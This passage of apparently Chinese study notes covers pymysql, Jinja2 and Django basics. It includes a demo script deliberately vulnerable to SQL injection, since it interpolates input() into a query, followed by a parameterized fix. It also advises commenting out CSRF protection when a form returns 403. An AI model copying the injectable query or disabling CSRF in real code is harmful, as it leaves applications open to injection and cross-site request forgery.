cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)  <span class="hljs-comment"># &#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x6E38;&#x6807;&#x5BF9;&#x8C61;(&#x5C31;&#x662F;&#x7528;&#x6765;&#x5E2E;&#x4F60;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;)</span>
<span class="hljs-string">&quot;&quot;&quot;
cursor=pymysql.cursors.DictCursor&#x5C06;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x4EE5;&#x5B57;&#x5178;&#x7684;&#x5F62;&#x5F0F;&#x8FD4;&#x56DE;
&quot;&quot;&quot;</span>
sql = <span class="hljs-string">&apos;select * from teacher;&apos;</span>
res = cursor.execute(sql)
<span class="hljs-comment"># print(res)  # execute&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x4F60;&#x5F53;&#x524D;sql&#x8BED;&#x53E5;&#x6240;&#x5F71;&#x54CD;&#x7684;&#x884C;&#x6570;  &#x6539;&#x8FD4;&#x56DE;&#x503C;&#x4E00;&#x822C;&#x4E0D;&#x7528;</span>
<span class="hljs-comment"># &#x83B7;&#x53D6;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;</span>
<span class="hljs-comment"># print(cursor.fetchone())  # &#x53EA;&#x62FF;&#x4E00;&#x6761;</span>
<span class="hljs-comment"># print(cursor.fetchall())  # &#x62FF;&#x6240;&#x6709;</span>
<span class="hljs-comment"># print(cursor.fetchmany(2))  # &#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x62FF;&#x51E0;&#x6761;</span>
print(cursor.fetchone())
print(cursor.fetchone())  <span class="hljs-comment"># &#x8BFB;&#x53D6;&#x6570;&#x636E;&#x7C7B;&#x4F3C;&#x4E8E;&#x6587;&#x4EF6;&#x5149;&#x6807;&#x7684;&#x79FB;&#x52A8;</span>
<span class="hljs-comment"># cursor.scroll(1,&apos;relative&apos;)  # &#x76F8;&#x5BF9;&#x4E8E;&#x5149;&#x6807;&#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#x7EE7;&#x7EED;&#x5F80;&#x540E;&#x79FB;&#x52A8;1&#x4F4D;</span>
cursor.scroll(<span class="hljs-number">1</span>,<span class="hljs-string">&apos;absolute&apos;</span>)  <span class="hljs-comment"># &#x76F8;&#x5BF9;&#x4E8E;&#x6570;&#x636E;&#x7684;&#x5F00;&#x5934;&#x5F80;&#x540E;&#x7EE7;&#x7EED;&#x79FB;&#x52A8;1&#x4F4D;</span>
print(cursor.fetchall())
</code></pre>
<p>&#x5B58;&#x5728;SQL&#x6CE8;&#x5165;&#x7684;demo&#x4EE3;&#x7801;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> pymysql

conn = pymysql.connect(host=<span class="hljs-string">&apos;127.0.0.1&apos;</span>, user=<span class="hljs-string">&apos;root&apos;</span>,password=<span class="hljs-string">&apos;root&apos;</span>, port=<span class="hljs-number">3306</span>, charset=<span class="hljs-string">&apos;utf8&apos;</span>, database=<span class="hljs-string">&apos;student1&apos;</span>)
print(conn)
cursor = conn.cursor(cursor=pymysql.cursors.DictCursor) <span class="hljs-comment"># &#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x6E38;&#x6807;&#x5BF9;&#x8C61;   &#x4E14;&#x4EE5;&#x5B57;&#x5178;&#x7684;&#x65B9;&#x5F0F;&#x8FD4;&#x56DE;</span>
id = input(<span class="hljs-string">&quot;&#x8BF7;&#x8F93;&#x5165;&#x67E5;&#x627E;&#x7684;&#x7528;&#x6237;id: &quot;</span>)
sql = f<span class="hljs-string">&quot;select * from ty_user where id=&apos;{id}&apos;;&quot;</span>
res = cursor.execute(sql)
print(res) <span class="hljs-comment"># &#x8FD4;&#x56DE;&#x7684;&#x884C;&#x6570;</span>
res2 = cursor.fetchone()
print(res2)
print(type(res2))
</code></pre>
<p><a href="https://imgse.com/i/p9lMSUO" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9lMSUO.png" alt="p9lMSUO.png"></a></p>
<p>&#x52A0;&#x4E0A;&#x9884;&#x7F16;&#x8BD1;&#x4E4B;&#x540E;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> pymysql

conn = pymysql.connect(host=<span class="hljs-string">&apos;127.0.0.1&apos;</span>, user=<span class="hljs-string">&apos;root&apos;</span>,password=<span class="hljs-string">&apos;root&apos;</span>, port=<span class="hljs-number">3306</span>, charset=<span class="hljs-string">&apos;utf8&apos;</span>, database=<span class="hljs-string">&apos;student1&apos;</span>)

print(conn)

cursor = conn.cursor() <span class="hljs-comment"># &#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x6E38;&#x6807;&#x5BF9;&#x8C61;</span>
id = input(<span class="hljs-string">&quot;&#x8BF7;&#x8F93;&#x5165;&#x67E5;&#x627E;&#x7684;&#x7528;&#x6237;id: &quot;</span>)
sql = <span class="hljs-string">&quot;select * from ty_user where id=%s;&quot;</span>
res = cursor.execute(sql, (id,))
res2 = cursor.fetchone()
print(res2)
</code></pre>
<p><a href="https://imgse.com/i/p9lMi2d" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9lMi2d.png" alt="p9lMi2d.png"></a></p>
<h5 id="jinja2">jinja2</h5>
<pre><code class="lang-python">pip3 install jinja2
&quot;&quot;&quot;&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x662F;&#x5728;&#x540E;&#x7AEF;&#x8D77;&#x4F5C;&#x7528;&#x7684;&quot;&quot;&quot;

# &#x6A21;&#x7248;&#x8BED;&#x6CD5;(&#x975E;&#x5E38;&#x8D34;&#x8FD1;python&#x8BED;&#x6CD5;)
{[ user ]}
{[ user.get(&apos;username&apos;)]}
{[ user.age ]}
{[ user[&apos;hobby&apos;] ]}


{# for user_dict in user_list #}
                        &lt;tr&gt;
                            &lt;td&gt;{[ user_dict.id]}&lt;/td&gt;
                            &lt;td&gt;{[ user_dict.username]}&lt;/td&gt;
                            &lt;td&gt;{[ user_dict.password]}&lt;/td&gt;
                            &lt;td&gt;{[ user_dict.hobby]}&lt;/td&gt;
                        &lt;/tr&gt;
{# endfor#}
</code></pre>
<h4 id="&#x547D;&#x4EE4;&#x884C;&#x4E0E;pycharm&#x521B;&#x5EFA;&#x7684;&#x533A;&#x522B;">&#x547D;&#x4EE4;&#x884C;&#x4E0E;pycharm&#x521B;&#x5EFA;&#x7684;&#x533A;&#x522B;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># 1 &#x547D;&#x4EE4;&#x884C;&#x521B;&#x5EFA;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x6709;templatew&#x6587;&#x4EF6;&#x5939; &#x9700;&#x8981;&#x4F60;&#x81EA;&#x5DF1;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x800C;pycharm&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x521B;&#x5EFA;&#x5E76;&#x4E14;&#x8FD8;&#x4F1A;&#x81EA;&#x52A8;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;&#x5BF9;&#x5E94;&#x7684;&#x8DEF;&#x5F84;</span>
<span class="hljs-comment"># pycharm&#x521B;&#x5EFA;</span>
TEMPLATES = [
    {
        <span class="hljs-string">&apos;BACKEND&apos;</span>: <span class="hljs-string">&apos;django.template.backends.django.DjangoTemplates&apos;</span>,
        <span class="hljs-string">&apos;DIRS&apos;</span>: [os.path.join(BASE_DIR, <span class="hljs-string">&apos;templates&apos;</span>)]
]
<span class="hljs-comment"># &#x547D;&#x4EE4;&#x884C;&#x521B;&#x5EFA;</span>
TEMPLATES = [
    {
        <span class="hljs-string">&apos;BACKEND&apos;</span>: <span class="hljs-string">&apos;django.template.backends.django.DjangoTemplates&apos;</span>,
        <span class="hljs-string">&apos;DIRS&apos;</span>: [],
]
<span class="hljs-string">&quot;&quot;&quot;
&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x4F60;&#x5728;&#x7528;&#x547D;&#x4EE4;&#x521B;&#x5EFA;django&#x9879;&#x76EE;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x5355;&#x5355;&#x9700;&#x8981;&#x521B;&#x5EFA;templates&#x6587;&#x4EF6;&#x5939;&#x8FD8;&#x9700;&#x8981;&#x53BB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;&#x8DEF;&#x5F84;
&apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)]
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="django&#x5C0F;&#x767D;&#x5FC5;&#x4F1A;&#x4E09;&#x677F;&#x65A7;">django&#x5C0F;&#x767D;&#x5FC5;&#x4F1A;&#x4E09;&#x677F;&#x65A7;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
HttpResponse
    &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;

render
    &#x8FD4;&#x56DE;html&#x6587;&#x4EF6;&#x7684;

redirect
    &#x91CD;&#x5B9A;&#x5411;
      return redirect(&apos;https://www.mzitu.com/&apos;)
    return redirect(&apos;/home/&apos;)
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="django">django</h4>
<pre><code class="lang-python"><span class="hljs-comment">#    &#x5B89;&#x88C5;django</span>
pip3 install django
<span class="hljs-comment">#    &#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x5B58;&#x5728;</span>
django-admin
<span class="hljs-comment">#    &#x521B;&#x5EFA;&#x9879;&#x76EE;</span>
django-admin startproject mysite
</code></pre>
<p><a href="https://imgse.com/i/p9l1dJS" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9l1dJS.png" alt="p9l1dJS.png"></a></p>
<pre><code class="lang-python"><span class="hljs-comment">#    &#x542F;&#x52A8;&#x9879;&#x76EE;&#xFF0C;&#x5207;&#x5230;&#x5BF9;&#x5E94;&#x76EE;&#x5F55;&#x4E0B;</span>
python manage.py runserver
<span class="hljs-comment">#    http://127.0.0.1:8000/</span>
python manage.py startapp app01
</code></pre>
<pre><code class="lang-python">-mysite&#x9879;&#x76EE;&#x6587;&#x4EF6;&#x5939;
    --mysite&#x6587;&#x4EF6;&#x5939;
      ---settings.py    &#x914D;&#x7F6E;&#x6587;&#x4EF6;
    ---urls.py            &#x8DEF;&#x7531;&#x4E0E;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;(&#x8DEF;&#x7531;&#x5C42;)
    ---wsgi.py            wsgiref&#x6A21;&#x5757;(&#x4E0D;&#x8003;&#x8651;)
  --manage.py                django&#x7684;&#x5165;&#x53E3;&#x6587;&#x4EF6;
  --db.sqlite3            django&#x81EA;&#x5E26;&#x7684;sqlite3&#x6570;&#x636E;&#x5E93;(&#x5C0F;&#x578B;&#x6570;&#x636E;&#x5E93; &#x529F;&#x80FD;&#x4E0D;&#x662F;&#x5F88;&#x591A;&#x8FD8;&#x6709;bug)
  --app01&#x6587;&#x4EF6;&#x5939;
      ---admin.py            django&#x540E;&#x53F0;&#x7BA1;&#x7406;
    ---apps.py            &#x6CE8;&#x518C;&#x4F7F;&#x7528;
    ---migrations&#x6587;&#x4EF6;&#x5939;        &#x6570;&#x636E;&#x5E93;&#x8FC1;&#x79FB;&#x8BB0;&#x5F55;
    ---models.py        &#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x7684; &#x6A21;&#x578B;&#x7C7B;(orm)
      ---tests.py            &#x6D4B;&#x8BD5;&#x6587;&#x4EF6;
    ---views.py            &#x89C6;&#x56FE;&#x51FD;&#x6570;(&#x89C6;&#x56FE;&#x5C42;)
</code></pre>
<h5 id="&#x6DFB;&#x52A0;&#x529F;&#x80FD;">&#x6DFB;&#x52A0;&#x529F;&#x80FD;</h5>
<p><a href="https://imgse.com/i/p9lrmdO" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9lrmdO.png" alt="p9lrmdO.png"></a></p>
<p>&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A;localhost:8000/index&#x65F6;&#x4F1A;&#x81EA;&#x52A8;render&#x6E32;&#x67D3;&#x5230;myfirst.html</p>
<p><a href="https://imgse.com/i/p9lrnoD" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9lrnoD.png" alt="p9lrnoD.png"></a></p>
<p><a href="https://imgse.com/i/p9lrQWd" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9lrQWd.png" alt="p9lrQWd.png"></a></p>
<p>.</p>
<p>&#x5728;settings&#x91CC;&#x9762;&#x5FC5;&#x987B;&#x52A0;&#x5165;&#x8FD9;&#x6BB5;</p>
<pre><code class="lang-python">STATIC_URL = <span class="hljs-string">&apos;static/&apos;</span>
<span class="hljs-comment">#   &#x9759;&#x6001;&#x6587;&#x4EF6;&#x914D;&#x7F6E;</span>
STATICFILES_DIRS = [
    os.path.join(BASE_DIR, <span class="hljs-string">&apos;static&apos;</span>)
]
</code></pre>
<p>&#x5728;views.py&#x91CC;&#xFF0C;&#x6211;&#x7684;login&#x65B9;&#x6CD5;&#x90A3;&#x91CC;&#xFF0C;&#x5982;&#x679C;&#x63D0;&#x4EA4;&#x67E5;&#x8BE2;&#xFF0C;&#x90A3;&#x4E48;&#x70B9;&#x51FB;&#x63D0;&#x4EA4;&#x67E5;&#x8BE2;&#x540E;</p>
<p><a href="https://imgse.com/i/p9lfem9" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9lfem9.png" alt="p9lfem9.png"></a></p>
<p><a href="https://imgse.com/i/p9lfKFx" target="_blank"><img src="https://s1.ax1x.com/2023/04/28/p9lfKFx.png" alt="p9lfKFx.png"></a></p>
<p>&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x5C06;post&#x5230;login&#x65B9;&#x6CD5;&#x7684;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;</p>
<p>&#x53E6;&#x5916;&#x5C31;&#x662F;&#x5982;&#x679C;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#x662F;403&#xFF0C;&#x5219;csrf&#x90A3;&#x91CC;&#x5FC5;&#x987B;&#x6CE8;&#x91CA;&#x6389;</p>
<p><a href="https://imgse.com/i/p93RWVA" target="_blank"><img src="https://s1.ax1x.com/2023/04/30/p93RWVA.png" alt="p93RWVA.png"></a></p>
<h4 id="django&#x94FE;&#x63A5;&#x6570;&#x636E;&#x5E93;mysql">django&#x94FE;&#x63A5;&#x6570;&#x636E;&#x5E93;(MySQL)</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x9ED8;&#x8BA4;&#x7528;&#x7684;&#x662F;sqkite3</span>
DATABASES = {
    <span class="hljs-string">&apos;default&apos;</span>: {
        <span class="hljs-string">&apos;ENGINE&apos;</span>: <span class="hljs-string">&apos;django.db.backends.sqlite3&apos;</span>,
        <span class="hljs-string">&apos;NAME&apos;</span>: os.path.join(BASE_DIR, <span class="hljs-string">&apos;db.sqlite3&apos;</span>),
    }
}

<span class="hljs-comment"># django&#x94FE;&#x63A5;MySQL</span>
    <span class="hljs-number">1.</span>&#x7B2C;&#x4E00;&#x6B65;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;
      DATABASES = {
    <span class="hljs-string">&apos;default&apos;</span>: {
        <span class="hljs-string">&apos;ENGINE&apos;</span>: <span class="hljs-string">&apos;django.db.backends.mysql&apos;</span>,
        <span class="hljs-string">&apos;NAME&apos;</span>: <span class="hljs-string">&apos;day60&apos;</span>,
        <span class="hljs-string">&apos;USER&apos;</span>:<span class="hljs-string">&apos;root&apos;</span>,
        <span class="hljs-string">&apos;PASSWORD&apos;</span>:<span class="hljs-string">&apos;admin123&apos;</span>,
        <span class="hljs-string">&apos;HOST&apos;</span>:<span class="hljs-string">&apos;127.0.0.1&apos;</span>,
        <span class="hljs-string">&apos;PORT&apos;</span>:<span class="hljs-number">3306</span>,
        <span class="hljs-string">&apos;CHARSET&apos;</span>:<span class="hljs-string">&apos;utf8&apos;</span>
    }
}
  <span class="hljs-number">2.</span>&#x4EE3;&#x7801;&#x58F0;&#x660E;    
      django&#x9ED8;&#x8BA4;&#x7528;&#x7684;&#x662F;mysqldb&#x6A21;&#x5757;&#x94FE;&#x63A5;MySQL
    &#x4F46;&#x662F;&#x8BE5;&#x6A21;&#x5757;&#x7684;&#x517C;&#x5BB9;&#x6027;&#x4E0D;&#x597D; &#x9700;&#x8981;&#x624B;&#x52A8;&#x6539;&#x4E3A;&#x7528;pymysql&#x94FE;&#x63A5;

    &#x4F60;&#x9700;&#x8981;&#x544A;&#x8BC9;django&#x4E0D;&#x8981;&#x7528;&#x9ED8;&#x8BA4;&#x7684;mysqldb&#x8FD8;&#x662F;&#x7528;pymysql
    <span class="hljs-comment"># &#x5728;&#x9879;&#x76EE;&#x540D;&#x4E0B;&#x7684;init&#x6216;&#x8005;&#x4EFB;&#x610F;&#x7684;&#x5E94;&#x7528;&#x540D;&#x4E0B;&#x7684;init&#x6587;&#x4EF6;&#x4E2D;&#x4E66;&#x5199;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x90FD;&#x53EF;&#x4EE5;</span>
    <span class="hljs-keyword">import</span> pymysql
        pymysql.install_as_MySQLdb()
</code></pre>
<h4 id="django-orm---&#x7C7B;&#x4F3C;&#x4E8E;net&#x7684;linq&#x8BED;&#x6CD5;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;">Django ORM   &#x7C7B;&#x4F3C;&#x4E8E;.net&#x7684;linq&#x8BED;&#x6CD5;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
ORM. &#x5BF9;&#x8C61;&#x5173;&#x7CFB;&#x6620;&#x5C04;
&#x4F5C;&#x7528;:&#x80FD;&#x591F;&#x8BA9;&#x4E00;&#x4E2A;&#x4E0D;&#x7528;sql&#x8BED;&#x53E5;&#x7684;&#x5C0F;&#x767D;&#x4E5F;&#x80FD;&#x591F;&#x901A;&#x8FC7;python &#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x4EE3;&#x7801;&#x7B80;&#x5355;&#x5FEB;&#x6377;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;
&#x4E0D;&#x8DB3;&#x4E4B;&#x5904;:&#x5C01;&#x88C5;&#x7A0B;&#x5EA6;&#x592A;&#x9AD8; &#x6709;&#x65F6;&#x5019;sql&#x8BED;&#x53E5;&#x7684;&#x6548;&#x7387;&#x504F;&#x4F4E; &#x9700;&#x8981;&#x4F60;&#x81EA;&#x5DF1;&#x5199;SQL&#x8BED;&#x53E5;

&#x7C7B;                                            &#x8868;

&#x5BF9;&#x8C61;                                    &#x8BB0;&#x5F55;

&#x5BF9;&#x8C61;&#x5C5E;&#x6027;                            &#x8BB0;&#x5F55;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x5BF9;&#x5E94;&#x7684;&#x503C;


&#x5E94;&#x7528;&#x4E0B;&#x9762;&#x7684;models.py&#x6587;&#x4EF6;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># 1 &#x5148;&#x53BB;models.py&#x4E2D;&#x4E66;&#x5199;&#x4E00;&#x4E2A;&#x7C7B;</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-comment"># id int primary_key auto_increment</span>
    id = models.AutoField(primary_key=<span class="hljs-keyword">True</span>)
    <span class="hljs-comment"># username varchar(32)</span>
    username = models.CharField(max_length=<span class="hljs-number">32</span>)
    <span class="hljs-comment"># password int</span>
    password = models.IntegerField()

*************************<span class="hljs-comment"># 2 &#x6570;&#x636E;&#x5E93;&#x8FC1;&#x79FB;&#x547D;&#x4EE4;*************************</span>
python manage.py makemigrations &#x5C06;&#x64CD;&#x4F5C;&#x8BB0;&#x5F55;&#x8BB0;&#x5F55;&#x5230;&#x5C0F;&#x672C;&#x672C;&#x4E0A;(migrations&#x6587;&#x4EF6;&#x5939;)

python manage.py migrate  &#x5C06;&#x64CD;&#x4F5C;&#x771F;&#x6B63;&#x7684;&#x540C;&#x6B65;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;
<span class="hljs-comment"># &#x53EA;&#x8981;&#x4F60;&#x4FEE;&#x6539;&#x4E86;models.py&#x4E2D;&#x8DDF;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x7684;&#x4EE3;&#x7801; &#x5C31;&#x5FC5;&#x987B;&#x91CD;&#x65B0;&#x6267;&#x884C;&#x4E0A;&#x8FF0;&#x7684;&#x4E24;&#x6761;&#x547D;&#x4EE4;</span>
******************************************************************

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-comment"># id int primary_key auto_increment</span>
    id = models.AutoField(primary_key=<span class="hljs-keyword">True</span>,verbose_name=<span class="hljs-string">&apos;&#x4E3B;&#x952E;&apos;</span>)
    <span class="hljs-comment"># username varchar(32)</span>
    username = models.CharField(max_length=<span class="hljs-number">32</span>,verbose_name=<span class="hljs-string">&apos;&#x7528;&#x6237;&#x540D;&apos;</span>)
    <span class="hljs-string">&quot;&quot;&quot;
    CharField&#x5FC5;&#x987B;&#x8981;&#x6307;&#x5B9A;max_length&#x53C2;&#x6570; &#x4E0D;&#x6307;&#x5B9A;&#x4F1A;&#x76F4;&#x63A5;&#x62A5;&#x9519;
    verbose_name&#x8BE5;&#x53C2;&#x6570;&#x662F;&#x6240;&#x6709;&#x5B57;&#x6BB5;&#x90FD;&#x6709;&#x7684; &#x5C31;&#x662F;&#x7528;&#x6765;&#x5BF9;&#x5B57;&#x6BB5;&#x7684;&#x89E3;&#x91CA;
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># password int</span>
    password = models.IntegerField(verbose_name=<span class="hljs-string">&apos;&#x5BC6;&#x7801;&apos;</span>)


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Author</span><span class="hljs-params">(models.Model)</span>:</span>
    <span class="hljs-comment"># &#x7531;&#x4E8E;&#x4E00;&#x5F20;&#x8868;&#x4E2D;&#x5FC5;&#x987B;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x4E3B;&#x952E;&#x5B57;&#x6BB5; &#x5E76;&#x4E14;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x53EB;id&#x5B57;&#x6BB5;</span>
    <span class="hljs-comment"># &#x6240;&#x4EE5;orm&#x5F53;&#x4F60;&#x4E0D;&#x5B9A;&#x4E49;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x7684;&#x65F6;&#x5019; orm&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;id&#x4E3B;&#x952E;&#x5B57;&#x6BB5;</span>
    <span class="hljs-comment"># &#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740; &#x540E;&#x7EED;&#x6211;&#x4EEC;&#x5728;&#x521B;&#x5EFA;&#x6A21;&#x578B;&#x8868;&#x7684;&#x65F6;&#x5019;&#x5982;&#x679C;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x540D;&#x6CA1;&#x6709;&#x989D;&#x5916;&#x7684;&#x53EB;&#x6CD5; &#x90A3;&#x4E48;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x4E0D;&#x5199;</span>
    <span class="hljs-comment"># username varchar(32)</span>
    username = models.CharField(max_length=<span class="hljs-number">32</span>)
    <span class="hljs-comment"># password int</span>
    password = models.IntegerField()
</code></pre>
<p><a href="https://imgse.com/i/p91G240" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91G240.png" alt="p91G240.png"></a></p>
<p><a href="https://imgse.com/i/p91GIu4" target="_blank"><img src="https://s1.ax1x.com/2023/04/29/p91GIu4.png" alt="p91GIu4.png"></a></p>
<p>&#x5982;&#x4E0B;&#xFF0C;&#x5229;&#x7528;</p>
<h4 id="&#x6570;&#x636E;&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;">&#x6570;&#x636E;&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x4ECA;&#x5929;&#x53EA;&#x4F1A;&#x4ECB;&#x7ECD;&#x4E00;&#x70B9;&#x70B9; &#x540E;&#x9762;&#x4F1A;&#x8BE6;&#x7EC6;&#x7684;&#x4ECB;&#x7ECD;</span>

<span class="hljs-comment"># &#x67E5;</span>
res = models.User.objects.filter(username=username)
<span class="hljs-string">&quot;&quot;&quot;
&#x8FD4;&#x56DE;&#x503C;&#x4F60;&#x5148;&#x770B;&#x6210;&#x662F;&#x5217;&#x8868;&#x5957;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x7684;&#x683C;&#x5F0F;
&#x5B83;&#x4E5F;&#x652F;&#x6301;&#x7D22;&#x5F15;&#x53D6;&#x503C; &#x5207;&#x7247;&#x64CD;&#x4F5C; &#x4F46;&#x662F;&#x4E0D;&#x652F;&#x6301;&#x8D1F;&#x6570;&#x7D22;&#x5F15;
&#x5B83;&#x4E5F;&#x4E0D;&#x63A8;&#x8350;&#x4F60;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x65B9;&#x5F0F;&#x53D6;&#x503C;
user_obj = models.User.objects.filter(username=username).first()
&quot;&quot;&quot;</span>
filter&#x62EC;&#x53F7;&#x5185;&#x53EF;&#x4EE5;&#x643A;&#x5E26;&#x591A;&#x4E2A;&#x53C2;&#x6570; &#x53C2;&#x6570;&#x4E0E;&#x53C2;&#x6570;&#x4E4B;&#x95F4;&#x9ED8;&#x8BA4;&#x662F;<span class="hljs-keyword">and</span>&#x5173;&#x7CFB;
&#x4F60;&#x53EF;&#x4EE5;&#x628A;filter&#x8054;&#x60F3;&#x6210;where&#x8BB0;&#x5FC6;



<span class="hljs-comment"># &#x589E;</span>
<span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> models
res = models.User.objects.create(username=username,password=password)
<span class="hljs-comment"># &#x8FD4;&#x56DE;&#x503C;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x88AB;&#x521B;&#x5EFA;&#x7684;&#x5BF9;&#x8C61;&#x672C;&#x8EAB;</span>

<span class="hljs-comment"># &#x7B2C;&#x4E8C;&#x79CD;&#x589E;&#x52A0;</span>
user_obj = models.User(username=username,password=password)
user_obj.save()  <span class="hljs-comment"># &#x4FDD;&#x5B58;&#x6570;&#x636E;</span>
</code></pre>
<pre><code>&#x9759;&#x6001;&#x6587;&#x4EF6;&#x914D;&#x7F6E;
</code></pre><ul>
<li><p>&#x9759;&#x6001;&#x6587;&#x4EF6;&#x914D;&#x7F6E;</p>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x8F93;&#x5165;url&#x4E4B;&#x6240;&#x4EE5;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#x662F;&#x56E0;&#x4E3A;&#x540E;&#x7AEF;&#x63D0;&#x524D;&#x5F00;&#x8BBE;&#x4E86;&#x8BE5;&#x8D44;&#x6E90;&#x7684;&#x8BBF;&#x95EE;&#x63A5;&#x53E3;

&#x6211;&#x4EEC;&#x4E60;&#x60EF;&#x5C06;html&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x5728;templates&#x6587;&#x4EF6;&#x5939;&#x4E0B;
&#x6211;&#x4EEC;&#x4E60;&#x60EF;&#x5C06;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x5728;static&#x6587;&#x4EF6;&#x5939;&#x4E0B;
    &#x9759;&#x6001;&#x6587;&#x4EF6;
        &#x7F51;&#x7AD9;&#x5DF2;&#x7ECF;&#x5199;&#x597D;&#x7684; &#x6D3B;&#x7740;&#x662F;&#x7B2C;&#x4E09;&#x65B9;&#x73B0;&#x6210;&#x7684;&#x4EE3;&#x7801; &#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x4F7F;&#x7528;
        css&#x6587;&#x4EF6;    js&#x6587;&#x4EF6;    img&#x6587;&#x4EF6;    &#x7B2C;&#x4E09;&#x65B9;&#x7EC4;&#x4EF6;

    static&#x6587;&#x4EF6;&#x5939;&#x5185;&#x8FD8;&#x4F1A;&#x521B;&#x5EFA;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#x5939;
        css
        js
        img
        &#x7B2C;&#x4E09;&#x65B9;

    django&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x521B;&#x5EFA;static&#x6587;&#x4EF6;&#x5939;&#x9700;&#x8981;&#x4F60;&#x81EA;&#x5DF1;&#x624B;&#x52A8;&#x521B;&#x5EFA;
&quot;&quot;&quot;
STATIC_URL = &apos;/static/&apos;  # &#x8BBF;&#x95EE;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x7684;&#x4EE4;&#x724C;

# &#x9759;&#x6001;&#x6587;&#x4EF6;&#x914D;&#x7F6E; settings.py
